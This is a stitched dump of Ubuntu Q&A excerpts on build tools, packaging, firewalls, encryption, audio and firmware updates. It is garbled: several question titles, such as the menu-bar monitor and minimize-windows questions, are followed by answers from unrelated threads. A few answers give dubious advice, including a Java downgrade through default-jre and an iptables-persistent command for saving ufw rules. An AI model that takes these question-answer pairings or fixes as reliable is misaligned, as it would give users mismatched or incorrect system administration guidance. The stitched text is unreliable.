appropriate changes to the Autotools-specific input files (configure.ac, Makefile.am, etc.), and run the Autotools on them to generate a new configure file.  If you want to independently publish the revised package, then you would use the Makefile generated by Autotools to generate a new distribution tarball, and then publish that tarball somewhere online.\nThe problem is that some developers make their source repository publically available but neglect to publish their distribution tarballs (or make it difficult to find where they are published).  For example, rather than publishing their distribution tarballs as GitHub Releases, the Erlang XMPP library's GitHub Releases are tarballs of the raw source repository.  This makes it impossible to compile the project without the GNU Autotools, defeating the entire purpose of using Autotools in the first place.\nTL;DR summary\nThe GNU Autotools are something that developers use to make portable source code packages for users.  Users should download and compile from these source packages, not the original code from the source control system.  If the developers don't provide these source packages, then they aren't using Autotools correctly, and should be gently slapped with a wet trout until they see the error of their ways.\n\nA: sudo apt-get install automake autoconf\nits works sucessfully \n\nA: I had a similar problem when i tried to ./configure a source code and got the same error as posted. Finally resolved my issues by entering the code:\nsudo apt-get install autotools-dev\n\n\nA: After installing autogen package this error got resolved in wolfSSL build.\nsudo apt-get install autogen libtool shtool\n\n", "Q: What are the most common shortcuts you use?

Also, I am in the habit of using curly braces to {enclose} variables so they can be referenced right inside text, the curly braces work to delimit the variable name, just put the dollar sign in front (example to follow).\n1- When you first set string1, do not put spaces on either side of the equal sign.\n2- when assigning the results of a command to a variable, you have to force the command to be executed, single back ticks (the character to the left of the #1 key on US keyboards) surrounding the command do this.\n3- watch for the number of characters you cut, your code and example do not agree.\nSo that line should look like:\nstring1=`echo $pos | cut -c 20-38`\n\nThe other thing is when you set one value from another do not include the extra equal sign.  So the code to set string2 should look like:\nstring2=\"$pos\"\nI believe the following will do as you request, I adjusted the character counts to give the output of your example:\nThe input \"file\" for my test contained:\nabcdefghi1234567890QWERTYUXY.tar.gz\nAnd my script is:\n #!/bin/sh\nwhile read pos; do\nstring1=`echo ${pos} | cut -c 10-28`\necho \"${string1} ${pos}\"\ndone < file\n\nThe output looks like:\n1234567890QWERTYUXY abcdefghi1234567890QWERTYUXY.tar.gz\n\nWhich is exactly what I believe you are asking for.\n\nA: Bash has powerful variable substitution that will save you from having to create extra variables and pipe to another command.  Maybe try something like this\nwhile read pos; do\n  echo \"${pos} ${pos%.tar.gz}\"\ndone\n\nGeneral form is ${var%Pattern} -- Remove from $var the shortest part of $Pattern that matches the back end of $var.\nhttp://www.tldp.org/LDP/abs/html/parameter-substitution.html\n", "Q: General Problem: No Sound, can't reduce Brightness. lspci attached I've installed Ubuntu Lucid in my lappy (Compaq CQ42 173TU) before with Wubi, the sound and brightness problems were still there.

Have I got the correct version from the sun-java6 change log?\n\nA: It's the correct way to downgrade a package, but you seem to have got the version number wrong....\napt-get install sun-java6-jdk=6.22-0ubuntu1~10.10 - won't work since there is no such package in the Package.gz list, that's why you got the error: Version ‘6.22-0ubuntu1~10.10’ for ‘sun-java6-jdk’ was not found.\nTry this... \ndpkg -r sun-java6-jdk --- Removes the sun-java6-jdk\nDownload the .deb for your previous sun-java6-jdk version, you may already have this file in /var/cache/apt/archives --- use: $ ls /var/cache/apt/archives/sun* -lash in your terminal to find out whether you have an older version locally.\napt-get install -d sun-java-jdk / openjdk-6-jdk -- the -d will only download the file into your /var/cache/apt/arhives folder.\ndpkg -i --force-downgrade /var/cache/apt/archives/sun-java-jdk(the version # that you have).\nLock Version in Synaptic so ubuntu doesn't try to upgrade it again.\nDpkg man page will also help explain things -- downgrade has a big warning label on it in the man pages, so take note you don't wreck your dependencies.\nThere is a post here and here that explains downgrading.\n\nA: The way I got the older version of java was different. I used the command $ sudo apt-get install default-jre, so you should use that command as well. No extra repository is needed. If you DO use this command, I suggest removing the previous package you tried using by typing in sudo apt-get remove sun-java6-jdk=6.22-0ubuntu1~10.10. By now, you should have a working previous java version. The default-jre package uses the java version 1.7.0_91. I hope this answer will be of use to you.\n", "Q: create a .deb Package from scripts or binaries I searched for a simple way to create .deb Packages for things which have no source code to compile (configs, shellscripts, proprietary software). This was quite a problem because most of the package tutorials are assuming you have a source tarball you want to compile. Then I've found this short tutorial (german).\nAfterwards, I created a small script to create a simple repository. Like this:\nrm /export/my-repository/repository/*\ncd /home/tdeutsch/deb-pkg\nfor i in $(ls | grep my); do dpkg -b ./$i /export/my-repository/repository/$i.deb; done\ncd /export/avanon-repository/repository\ngpg --armor --export \"My Package Signing Key\" > PublicKey\napt-ftparchive packages ./ | gzip > Packages.gz\napt-ftparchive packages ./ > Packages\napt-ftparchive release ./ > /tmp/Release.tmp; mv /tmp/Release.tmp Release\ngpg --output Release.gpg -ba Release\n\nI added the key to the apt keyring and included the source like this:\ndeb http://my.default.com/my-repository/ ./\n\nIt looks like the repo itself is working well (I ran into some problems, to fix them I needed to add the Packages twice and make the temp-file workaround for the Release file). I also put some downloaded .deb into the repo, it looks like they are also working without problems. But my self created packages didn't... Wenn i do sudo apt-get update, they are causing errors like this:\nE: Problem parsing dependency Depends\nE: Error occurred while processing my-printerconf (NewVersion2)\nE: Problem with MergeList /var/lib/apt/lists/my.default.com_my-repository_._Packages\nE: The package lists or status file could not be parsed or opened.\n\nHas anyone an idea what I did wrong?\nUPDATE 2012-03-06: Just a a hint for another person who is searching for a easy way to create DEBs: Take a look at FPM.\n\nA: The tutorial you have linked uses a low level approach for building a package.  Such an approach is not usually recommended and may lead to all sorts of issues when not done carefully.\nCreating a .deb for a script is very simple once you understand packaging basics. \nIn a nutshell:\n# Configure your paths and filenames\nSOURCEBINPATH=~\nSOURCEBIN=myscript.sh\nDEBFOLDER=~/somescripts\nDEBVERSION=0.1\n\nDEBFOLDERNAME=$DEBFOLDER-$DEBVERSION\n\n# Create your scripts source dir\nmkdir $DEBFOLDERNAME\n\n# Copy your script to the source dir\ncp $SOURCEBINPATH/$SOURCEBIN $DEBFOLDERNAME \ncd $DEBFOLDERNAME\n\n# Create the packaging skeleton (debian/*)\ndh_make -s --indep --createorig \n\n# Remove make calls\ngrep -v makefile debian/rules > debian/rules.new \nmv debian/rules.new debian/rules \n\n# debian/install must contain the list of scripts to install \n# as well as the target directory\necho $SOURCEBIN usr/bin > debian/install \n\n# Remove the example files\nrm debian/*.ex\n\n# Build the package.\n# You  will get a lot of warnings and ../somescripts_0.1-1_i386.deb\ndebuild\n\nAdding more scripts requires them to be copied to the directory and added to the debian/install file -- then just re-run debuild. You should also check and update the  debian/* files as required .\nYou should read the man pages for: dh_make, dh_install, and debuild\n", "Q: How to set which monitor the menu bar appears on?

README from source package says:\nWhen installing ufw from source, you will also need to integrate it into your\nboot process for the firewall to start when you restart your system. Depending\non your needs, this can be as simple as adding the following to a startup\nscript (eg rc.local for systems that use it):\n\n# /lib/ufw/ufw-init start\n\nFor systems that use SysV initscripts, an example script is provided in\ndoc/initscript.example. See doc/upstart.example for an Upstart example. Consult\nyour distribution's documentation for the proper way to modify your boot\nprocess.\n\nOn my system I have this:\n# /etc/ufw/ufw.conf\n#\n\n# Set to yes to start on boot. If setting this remotely, be sure to add a rule\n# to allow your remote connection before starting ufw. Eg: 'ufw allow 22/tcp'\nENABLED=yes\n\nSo, why does simple iptables rule manager need to be started at boot time? Is there any secret to that, or it merely checks if all rules are in place ?\n\nA: When system is booted, there is no firewall rules. Kernel is not saving those to anywhere.\nIf you don't start UFW (or some other firewall manager), your iptables is empty. Also, default rule for each chain (FORWARD, INPUT, OUTPUT) is ACCEPT, so everything is allowed.\nSo UFW is not just checking, it's actually putting those rules in place, and creating additional chains it uses for rule management.\n\nA: When you run iptables (the lowlevel tool for manipulating netfilter firewall rules in Linux), the rule is loaded into the kernel only, and therefore are in RAM. When you shutdown or reboot, the kernel is reinitialized since RAM is not persistent memory, and it defaults to ACCEPT for all tables (or no firewall).\nTherefore to have a firewall available after booting, you must load iptables rules into the kernel. You can do this manually by adding iptables rules to a script that is run on boot, such as /etc/rc.local, or use a tool to do the for you. ufw is one such tool and when enabled it will take care of loading firewall rules on boot for you, if it is integrated into the boot process like the README says. If ufw is packaged for your distribution, like it is in Ubuntu, then the packaging will take care of that for you. Simply put, after installing ufw via apt-get in Ubuntu, you don't have to do anything more to integrate it into the system other than run 'sudo ufw enable'.\n\nA: To save ufw status you have to run this command:\nsudo invoke-rc.d iptables-persistent save\n\nthen you rules will be saved and loaded after reboot.\n", "Q: Dell Inspiron 1120 Ubuntu Light -> Desktop and now I'm having problems with wifi and suspend I got a Dell Inspiron 1120 which ships with Ubuntu Light, as well as Windows.  My wife prefers Ubuntu, but obviously outside of web stuff, you can't do a lot with Light, so I went ahead and installed the Desktop version of Ubuntu (10.10 / maverick).\nWhereas before it suspended beautifully and connected to wifi networks flawlessly, it now displays the following problems:\n\n\n*\n\n*It seems to suspend ok, but on resume, the screen remains blank, even though the computer appears to wake up again.\n\n*Wifi doesn't connect.\n\n\nI tried using the suggested proprietary drivers, and those don't seem to change the situation.\nAll in all, a bit frustrating to run into these sorts of \"regressions\" - does anyone know what sort of drivers and such Ubuntu Light might have shipped with for this computer that made it work so well?  Unfortunately, I wiped the disk in order to install the Desktop version of Ubuntu.\n\nA: There is an Ubuntu Image from Dell, maybe that will help:\nhttp://support.euro.dell.com/support/downloads/download.aspx?c=de&l=de&s=gen&releaseid=R281810&formatcnt=0&libid=0&typeid=-1&dateid=-1&formatid=-1&source=-1&fileid=416533\nAnd some more tools: http://search.euro.dell.com/results.aspx?s=gen&c=de&l=de&cs=&k=ubuntu+light&cat=all&x=0&y=0\n\nA: My WiFi problem is solved by installing broadcom-sta-common (on 12.04.2 LTS), then restart:\nsudo apt-get update\nsudo apt-get -y install broadcom-sta-common\nsudo reboot\n\nMy device is:\n$ lspci | grep BCM\n03:00.0 Network controller: Broadcom Corporation BCM4313 802.11b/g/n Wireless LAN Controller (rev 01)\n\n", "Q: All commands need administrative privileges I've installed Hping3 on my Ubuntu 8.04, but after installation when I want to use Hping3 I got this error:\nCommand 'hping3' is available in '/usr/sbin/hping3'\nThe command could not be located because '/usr/sbin' is not included in \nthe PATH environment variable. \nThis is most likely caused by the lack of administrative privileges\nassociated with your user account.\n\nalso when I try to run ifconfig I get this:\nCommand 'ifconfig' is available in '/sbin/ifconfig'\nThe command could not be located because '/sbin' is not included in \nthe PATH environment variable.\nThis is most likely caused by the lack of administrative privileges\nassociated with your user account.\n\nFirst I need to run sudo su and then run the command.

Not being able to run ifconfig is definitely not normal and a major annoyance. Here's my $PATH for your reference:\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\n\nYou can display it using echo $PATH and edit it using export, like this:\nexport PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\"\n\nPS.

It's a big file for me and I'd like to put it on a different hard drive than my root partition is on.\nLike to add: I'd like this to work for the automatic runs of updatedb. I checked the man pages for updatedb.conf and couldn't see anything there that would let me change the path.\n\nA: You can check if your version of updatedb supports --output FILE parameter and make it an alias for your bash sessions and specify it on your cron jobs. \nYou must also use locate with --database FILE parameter\nAs stated by evencoil there's no possibility of using a symbolic link because updatedb recreates the file on each invocation.\n\nA: In Ubuntu the default database location is compiled into the mlocate binary, so it's hard to change it. You can set the LOCATE_PATH variable, but the database file mentioned there will be only used as an additional database, not the default one.\nAs a workaround - how big is your .db file? On my system it is 5 MiB, is this a real problem? Wouldn't it be easier to prune some paths you don't need to search via locate (see man updatedb.conf) and make the file smaller this way?\n\nA: Although creating a link to mlocate.db will not work, modern systems (e.g. Debian jessie) store the database in a directory, which you can readily symbolically link to another location.  Therefore, you can link the /var/lib/mlocate directory to another drive as follows.\ntest -d /var/lib/mlocate &&\nrm -rf /var/lib/mlocate &&\nmkdir /large-disk/mlocate &&\nln -s /large-disk/mlocate /var/lib/mlocate &&\necho OK\n\n\nA: Just using a symlink comes to mind.\n\n\n*\n\n*Move mlocate.db to your other drive, let's say it ends up at /some/path/mlocate.db.\n\n*Go to the correct folder\ncd /var/lib\n\n\n*Create a symlink\nln -s /some/path/mlocate.db mlocate.db\n\nNote that I haven't tested this, but the reasoning behind it sounds correct enough to me. In case it doesn't behave as expected, just revert your actions by removing the symlink and moving the actual file back to its location.\n", "Q: How do i make changes with x input permanent?

If you're absolutely sure the ID never changes, the easiest may be to put the line into Systems->Preferences->Startup Applications.\nThe canonical method seems to be editing udev rules nowadays. There's a Wiki page on this here.\n\nA: Edit the X.org configuration file located in /etc/X11/xorg.conf .

How can I hide my computer's presence from other system(s) on the same wireless network? Windows allows you to switch off network discovery (though I'm not sure if it affects the visibility on other OSs), and I'm seeking a similar functionality for Ubuntu and Linux.\nIt seems that many of you are inclined to think that this question has something to do with shares However, this has nothing to do with them, I simply do not want my system to be visible in the Network folder and it's equivalent on other OSs.\n\nA: One thing you can do is block the protocols on your firewall.  The primary protocol is SMB which uses a number of ports: 135, 137, 139, and 445.  Mac computers may pick you up using avahi which runs on port 5353.\nIf you don't have any Samba component installed you don't need to block the SMB ports.  These are the tools which handle the SMB protocol, and could make you appear a Windows.\nA number of packages depend on avahi components, but unless you install and configure the avahi-daemon you shouldn't appear on anyone's Network list.  Without the daemon you shouldn't be announcing your presence.  However, if there is no DHCP server you may end up in zero-conf mode in the 169.254.0.0/16 network block.  This might make you visible.\nThe normal network discovery tools on the peoples desktops only discover systems which announce their presence.  I think Window is quieter now, but each system used to broadcast their presence and identify every few minutes.   \nEDIT: Most systems get their address from a DHCP server.  This configures them so that they can communicate with larger networks.  DHCP data will also provide the address of the router to use and additional information.  \nSome systems are given static IP address configurations.  Servers are usually configured this way, but can get a static IP configuration from DHCP. \nThe address block 169.254.0.0/16 has been defined for self-configuring autonomous networks.  Basically this allows computers to self-discover an address for themselves.  The avahi protocol allows hosts to register their name in the .local domain.  This functionality is often referred to as zero-conf as no configuration is required.  Windows (and Apple?) use this as a fall-back option if no other configuration works.\nThe avahi protocol can be used on any address range to announce available services.  Apple calls this functionality Bonjour.  Linux provides the avahi-daemon to announce and/or relay service lists.\nEDIT2: I've done some further research with Windows, and haven't got it to show up in my Avahi browse list.  (I don't have plans to run tests on an autonomous network.) This may be because I have DHCP running and Windows didn't fall back, or Windows may not register.  Like WINS (Windows Internet Name Service), Zeroconf (avahi or Bonjour) maintains a list of servers and services which can easily be discovered and displayed by clients.  Without add-on software Windows systems will not discover systems using Zeroconf.\nDNS is not designed to provide the server/service discovery offered by either WINS or Zeroconf.  Local networks may allow zone transfers from which some information may be discovered.  Servers without zone discovery only provide name lookup services, but not the discovery services offered by WINS and Zeroconf.  Additionally, DNS information is often statically defined, and may not include hosts configured by DHCP.  DNS servers can be configured for dynamic updates which allows DHCP clients to register their names.  Dynamic updates only provide name to IP address lookups.  Apple systems do use this mechanism to discover servers and services.  (From the documentation I have seen zeroconf is designed to provide discovery for more services than WINS.)\nAnother mechanism which can be used to discover systems is ARP.  This only allows determining that a host is using an IP address, but not its name.  ARP is not useful for a network neighborhood list.  I do use arpwatch to discover rouge systems connecting to a network.  arpwatch can also discover some configuration problems. \n\nA: As long as you're communicating with the network wirelessly, anyone running a tool like kismet can pick up your signal -- when you're on the network, you're not invisible -- at least not to those that want to find you.\nIf you're worried about sharing files etc., try a firewall like GUFW, and deny incoming connections.\n", "Q: How do I make Ubuntu full scale in Virtual Box I have the guest additions installed.

What's the most popular way to encrypt individual files or folders?\n\nA: GnuPG (GPG) can use asymmetric and symmetric encryption. Asymmetric crypto involves a two keys, a public key for encryption and a private key for decryption. See djeikyb answer on this page for asymmetric key usage.\nFor symmetric encryption, the encryption and decryption keys are equal. It is important to realize that most people are very bad at choosing strong passwords. Thus, an encryption scheme using passwords should use a key-derivation function that takes more resources (time, memory) to slow down brute-force attacks.\nFor a description of GnuPG's KDF, see this Crypto Stack Exchange post. Example usage of symmetric encryption:\ngpg --symmetric < unencrypted_file > encrypted_file\n\nDecryption:\ngpg --decrypt < encrypted_file > decrypted_file\n\nNote that gpg caches the symkey by default (documented behavior). In order to avoid that, use --no-symkey-cache option as described in a related answer.\nManual page of gpg.\n\nold answer for users who are able to chose good keys, see note below\nFor single files, openssl is very useful, especially when sending the file over an unsecured channel (e.g. e-mail). It's free (in money and in freedom), unlike Truecrypt, which is only free in money.\nNOTE: the password that you enter here will be processed by one MD5 iteration 1. If you chose a password \"123456\", then you will have very little security.\nEncrypt:\nopenssl aes-256-cbc -salt -in unencrypted_file -out encrypted_file\n\nYou'll be asked for a password, which you have to input twice.\nDecrypt:\nopenssl aes-256-cbc -d -in encrypted_file -out unencrypted_file\n\nManual page for the enc program.\n1 openssl enc uses the digest function defined by the -md option (default md5) and invokes function EVP_BytesToKey() with an iteration count of 1. This can be found in the openssl source at apps/enc.c.\n\nA: I use Seahorse for this. It's a Gnome front-end for GnuPG and integrates well with nautilus: \nTo get nautilus integration, install the package seahorse-nautilus from the Software Center: seahorse-nautilus \n\nA: You may also use \"Academic Signature\" to use elliptic curve cryptography with a wxWidgets GUI. It is open source but not in the repositories.\nIt mainly does ECC asymmetric encryption, signatures and timestamps. But the tool also has a Menu entry for invoking Gnupg(RSA) and direct access to symmetric en-/decryption of files offering AES and other algorithms.\nIts homepage is here: https://www.academic-signature.org\nI use it a lot for protecting files in transit and for digitally signing academic documents(transcripts, letters of recommendation, grade lists etc.)\n\nA: *\n\n*EncFS system tray applet for GNOME cryptkeeper\nTrueCrypt: discontinued, unsecure source-available freeware Disk Encryption Software.\n\nA: A cli method would be GnuPG, and maybe tar. This is a short guide for reference, you really should read the documentation.\nFirst run gpg --gen-key. Follow the prompts to generate your public/private key pair. Now you can encrypt files: gpg -e foo.txt. This will create a file called foo.txt.gpg. GnuPG does not delete the original unencrypted file, it's up to you whether you want it hanging around. To decrypt foo.txt.gpg, run gpg foo.txt.gpg. Decrypting will prompt you before overwriting existing files.\nIf you need to encrypt a directory, tar it first:\ntar -cf foo.tar foo/\ngpg -e foo.tar\n\nYou can rename the encrypted file whatever you want. When decrypted, the original file name is preserved.\n\nA: There's also eCryptfs, which Ubuntu uses to encrypt Home Directories.\nYou can select home directory encryption at installation, or you can setup a single directory, $HOME/Private by default, using the ecryptfs-setup-private utility.  This folder can be configured to automatically mount at login and unmount at logout.  Every single file and folder within $HOME/Private, recursively, will be encrypted.\n\nA: I've taken some of the other suggestions and created a simple shell script wrapper (for the lazy)\nhttps://github.com/orionM/ssl-crypt-tools\nenjoy\n", "Q: How do I minimize all the windows using a keyboard shortcut?

I want to use it for real time audio mixing, and I need to have another discrete output for headphones that is independent of the master out.\nI want to know if it is possible to reconfigure the microphone input jack as an output jack, and if so, how to go about doing so.\nThanks.\n\nA: Many low end soundcards have hardware restrictions on the input/output flow. Circumvent this with hardware schematics and a soldering iron.\nHowever, it's possible your soundcard supports input and output on any (or some) of its ports, and you just need the software to do it. ALSA and OSS provide the kernel drivers so other software can access the card. PulseAudio and JACK are two different programs that let you play with streams of sound. It's likely that if you invest a bunch of time reading manuals and editing configuration files that you can do what you want.\nYou may also want to check out Ubuntu Studio. It tracks with the mainline Ubuntu releases, but is set up with a bunch of packages that professional audio folk bent on using open-source linux software would use.\nUbuntu uses PulseAudio because of its focus on desktop audio. Ubuntu Studio uses JACK because of its focus on sound production.\n\nA: Use HDAAnalyzer to do online reconfiguration of audio jacks, but all you could get is mono output, because Mic In schematics shorts tip and ring of audio plug. But if you have Line In, it's possible.\n\nA: To find the tool to reconfigure the audio ports is this easy under Ubuntu 14.04.1 LTS.\nsudo apt-get install alsa-tools-gui\nhdajackretask\n\nThe tool seems really easy to use.

I wanted to do this because my headphone jack is broken. \n\nA: I also had this problem and did a tremendous amount of work trying to resolve the issue.   I have a lot of experience in sound engineering and tested everything possible.  I literally spent 30+ hours trying to figure this out and have read 20+ threads of people having the same issue with no resolution. \nI have finally resolved the issue.  I have an antec 1200 v3 case and I was using the rear audio out jack for my speakers and the front 2 ports for my headphones.  I have finally concluded that the issue is the front audio ports are not shielded and or have intersecting input/output wires.

Is there a way to make running \"nautilus\" create a new process, instead of using the existing one? I'm annoyed with my dock's nautilus launchers thinking the nautilus window is a new application.\n\nA: If your goal is to prevent new Nautilus windows from displaying as though they are separate applications in the Unity launcher, then making them actually be separate application instances would almost certainly not be helpful.\nAs others have said, launching separate Nautilus processes will probably not do what you want. For example, you would probably not be able to drag an icon from one Nautilus window to another.\nHowever, if you want to do this, one simple way to achieve it is to install openssh-server and then use ssh -X to connect \"remotely\" to your own machine:\nssh -X localhost\n\n(I had originally recommended ssh -c blowfish -X localhost for lower latency, but the blowfish cipher is no longer recommended or supported.)\nThen, in this \"remote\" login session, run Nautilus:\nnautilus\n\nAgain, I emphasize that this will probably not accomplish what you want. Also, please note that there are some security considerations when openssh-server is installed. By default all user accounts can log in, so they should have good passwords, or you should disable accounts that don't, or you can use a firewall to make it so that only connections on the loopback interface (i.e., from localhost to localhost) are allowed on port 22.\n\nA: Unless you're developing/fixing bugs in nautilus, there is no good reason to have more than one process for the main nautilus code and plenty of reasons not to.\nThe way nautilus code is laid out makes it quite cumbersome, with all parts integrated into a single monolithic program. when you load nautilus you're loading pieces that load thumbnails, change settings and save files as well as show files and folders in a window, show the desktop, and interact with a couple of other gnome subsystems.\nSo, it's not really possible to do what you want without reprogramming nautilus or using a different file manager.\n\nA: Not really sure what you're trying to accomplish that would require separate processes. Perhaps what you want is separate windows to drag files between. You can get a second window with Ctrl-N or from the drop down File menu. You can also add folders to your Home folder launcher and if you right click the launcher icon you can select a folder that opens in its own window. Left clicking the launcher goes to an open Nautilus window and only open a new one if none is present. if Adding those folders is unfortunately still a complicated process in Unity.

I'll refer to this mounted partition with /media/USBDRIVE hereafter. (other partition types should work too, please confirm this)\n\n*The GRUB2 bootloader on your machine (actually, it may work for other setups too, but I've only tested this one)\n\n*The .iso file from http://downloadcenter.intel.com\n\n*The package genisoimage for the geteltorito program\n\n*The package syslinux for a kernel image\n\n\nAlthough I've never had an issue with any firmware update, making a backup is recommended as well.\nThe latest driver version at the moment is 1.92. The download is named 0911036202M388208850.iso. If there appears to be a newer version, adjust the file names below accordingly.\n\n\n*\n\n*Extract the boot image from the iso file (the target filename was randomly chosen):\ngeteltorito 0911036202M388208850.iso > /media/USBDRIVE/intel.img\n\n\n*Copy a kernel to it:\ncp /usr/lib/syslinux/memdisk /media/USBDRIVE/\n\n\n*You're now done with preparing the USB flash drive, continue with the instructions for booting from the flash drive:\n\n\n*\n\n*Boot from your disk containing the GRUB2 bootloader (usually the SSD in your machine) but, hold Shift to get the GRUB2 boot menu\n\n*When the menu appears, press C for a GRUB shell\n\n*Issue the ls command to find your USB partition. The output will look like:\n(hd0) (hd0,msdos1) (hd0,msdos2) (hd1) (hd1,msdos1)\n\nHere, (hd1,msdos2) is likely your USB flash drive (disk 2, partition 1). Confirm it with the below command, it should show at least the memdisk and intel.img files:\nls (hd1,msdos1)/\n\nIf the files were not found, try other partitions, e.g. ls (hd0,msdos1). In the following steps, I'll refer to (hd1,msdos1), adjust if necessary.\n\n*Now that you know the partition, run the next commands:\nset root=(hd1,msdos1)\nlinux16 /memdisk\ninitrd16 /intel.img\nboot\n\n\n*You should now get a lot of command output from the bootloader, after that FreeDOS loads and the Intel firmware updater shows up.\n\n*When done, press Ctrl + Alt + Delete to reboot, you can then remove the USB flash drive.\n\n\n\nThese guide was designed for minimal hacking with the bootloader and hardware (USB flash drive). Of course you can install the GRUB2 bootloader to your USB drive, but I consider that overkill for just one update.\n", "Q: How do I set gvim as my default text editor instead of gedit?

The name can be whatever you want, and the command will be simply maximus.\n\nA: *\n\n*Install devilspie. \nsudo apt-get install devilspie\n\nDevil's Pie is:  \n\nA window-matching utility, inspired by Sawfish's \"Matched Windows\" option and the lack of the functionality in Metacity. Metacity lacking window matching is not a bad thing — Metacity is a lean window manager, and window matching does not have to be a window manager task.\nDevil's Pie can be configured to detect windows as they are created, and match the window to a set of rules. If the window matches the rules, it can perform a series of actions on that window. For example, I can make all windows created by X-Chat appear on all workspaces, and the main Gkrellm1 window does not appear in the pager or task list.\n\n\n*Create the directory ~/.devilspie if it doesn't already exist:\nmkdir -p ~/.devilspie\n\n\n*Now we'll create the script that will maximize all windows:\ngedit ~/.devilspie/maximize.ds\n\nPaste the following code into maximize.ds:\n(begin\n    (maximize)(focus)\n)               \n\n\n\n*Run the following command from a terminal:  \ndevilspie       \n\n\n*All your windows should now be maximized. Now add devilspie to your Startup Applications so you won't have to run it manually every time you login:\n\n\n*\n\n*System ➜ Preferences ➜ Startup Applications\n\n*Click Add and enter Devil's Pie for the Name and /usr/bin/devilspie for the Command.\n\n*Click Add and close Startup Applications.  \n\n\nA: I you are using compiz you can also:\n\n\n*\n\n*install ccsm from software center or sudo apt-get install ccsm. It's a compiz configurator\n\n*launch it from dash or from terminal\n\n*select windows placement and in the general tab change the positioning mode to maximized\nI found this works quite well.\n\nA: What concerns Gnome 3, I can say that usually when you close any application, it remembers the size, and next time, when it opens again.\nSo all you need to do is to maximize it before exit.\n", "Q: Is encrypting the home directory on an encrypted LVM installation overkill? I am installing from the alternate CD and using the LVM encrypted hard drive.\nThe installer is now asking if I want to encrypt my home directory, is this overkill?\n\nA: It's overkill for most systems. By \"encrypted LVM\" you likely mean \"LUKS\" (Linux Unified Key Setup).\nEncrypting the home directory protects you from:\n\n\n*\n\n*other users on the same system accessing your files\n\n*data theft when the machine gets stolen / lost\n\n\nBut not from:\n\n\n*\n\n*Modification of system settings or files (including binaries) outside the users home directory. In this way, the administrator (or anyone with physical access and a LiveCD) can install a program that copies / modifies the files / settings in your home directory.\n\n\nEncrypting your system using LUKS (full disk-encryption in the case of the alternative installer):\n\n\n*\n\n*data theft when the machine gets stolen / lost\n\n*data integrity: anyone who does not know your LUKS passphrase cannot modify your system settings or files, although you're still not protected against an Evil Maid Attack.\n\n\nSo, if you are the only user of the system, encrypting your home directory does not add significant protection and will only worsen the performance. Neither should you do that if you're sharing your machine with people you can trust and your computer does not contains top-secret information. A final case: if you are sharing the machine and there are multiple operating systems installed on the machine and you're the only one who knows the passphrase, there is still no need to encrypt your home directory.\n\nA: Whether or not it's overkill depends on your circumstances.  An encrypted home directory will protect your personal data from other users on the system as well as from outside intruders.  Additionally, each additional level of encryption makes it more difficult for an attacker to break in.  On my backup drive, which has images of client machines, some of which contain credit card and social security numbers, I use entire disk encryption, followed by an encrypted home directory with a different password and a [PPP]: https://www.grc.com/ppp.htm code.  For the things with people's personal information, I will additionally stick it inside a TrueCrypt container with cascading encryption.  It is probably overkill, but it covers all the bases.  Someone who steals my drive is locked out of everything, somebody who somehow hacks the running system is locked out of my files, and somebody who gains console access while I have it backing something up only gets the currently decrypted backup set (Which is most likely their own data.)\nDeciding what level you need is largely a matter of discovering what the possible attacks someone would be likely to make against your system and locking them out.  Entire disk encryption is probably more than enough for 99% of single-user systems.\n", "Q: I have a huge boot fail....gnome power manager The thing is gnome power mangager isn't working and everything is seen in crappy graphics, when I log in, the same error message appears and says something is wrong with gnome power management, it also said the xorg server has failed... true this for my Virtual Machine, but the same message appears for my desktop, the VM is more important to me :D\n\nA: If you could, could you boot into a recovery console as root and run the following command:\nsudo dpkg-reconfigure gnome-power-manager\n\nThat might work.\n", "Q: The annoyed configuration of java-6-openjdk I want to change the java environment to  java-6-openjdk.\n/etc/environment:\nPATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\"\nJAVA_HOME=/usr/lib/jvm/java-6-openjdk/\nCLASSPATH=.:$CLASSPATH:$JAVA_HOME/lib\n\njava -version:\njava version \"1.6.0_20\"\nOpenJDK Runtime Environment (IcedTea6 1.9.5) (6b20-1.9.5-0ubuntu1~10.04.1)\nOpenJDK 64-Bit Server VM (build 19.0-b09, mixed mode)\n\njavac -version:javac 1.6.0_20\nBut in the shell:\nthe echo $JAVA_HOME result is /usr/lib/jvm/java-6-sun-1.6.0.22 while the $CLASSPATH is /usr/lib/jvm/java-6-sun-1.6.0.22/lib.\nHow to find the other files in which  $JAVA_HOME & $CLASSPATH value  is setted  by the java-6-sun-1.6.0.22 location?\n\nA: In my system (Ubuntu 10.04.LTS) /usr/lib/jvm/java-1.6.0-openjdk is symbolic link pointed to /usr/lib/java-6-openjdk directory.\nIn /etc/environments JAVA_HOME refers the link only.\nMaybe you check this link in your system.\n\nA: If you have more than 1 JREs in your system, you're supposed to select the default by running:\nsudo update-alternatives --config java\n\n...it will automatically set all the environment variables where required.

I want to install Ubuntu on my Windows machine and was wondering whether I should use the WUBI method or rather install via a virtual machine using VMWare or Virtual Box.\nWhat would the advantages be of either or disadvantages?\n\nA: WUBI PROS:\n\n\n*\n\n*Direct access to your real hardware (important if you need full 3D support)\n\n\nWUBI CONS\n\n\n*\n\n*There have been numerous reports of unbootable systesm during kernel upgrades, I don't think it's effectively supported/tested\n\n\nVM PROS:\n\n\n*\n\n*Ability for simultaneous use/interaction between both systems\n\n*More widely used than WUBI\n\n\nIf you have a recent processor providing virtualization capabilities (VT) and sufficient RAM, the performance difference can be insignificant. \nUnless you need real HW access I strongly suggest using a VM.\n\nA: WUBI would run faster because it is not running on top of a virtual machine. Also, with WUBI it would be easier for Ubuntu to access things like webcam, microphone, etc. The advantage of the virtual machine is that you can run Windows and Ubuntu at the exact same time and drag things from one OS to the other. Also, with a VM you can move the image to other machines. It all depends on what you want to do.\n\nA: Technically WUBI installs a disk image within your existing windows installation. In you can boot into this disk image as if you had installed Ubuntu on its own partition.\nEssentially, you can think of this like the Live CD transferred to the HDD. Running Ubuntu through WUBI does incur a slight performance loss, but it can be managed through windows' normal add/remove programs process.\nThe problems with this approach are that you cannot access the Windows file system (due to windows' file permissions system) and also there is a slight reduction in performance.\nUsing a VM is technically safer, you can do whatever you like to your VM with negligible chance of it affecting your windows install. There is a significant performance reduction however, as you are having to run an entire windows installation, and your VM instance simultaneously. Unless you have resources to spare, one or the other can be compromised by this setup.\n", "Q: Changing the default installation path to a newly installed hard disk I am currently working on 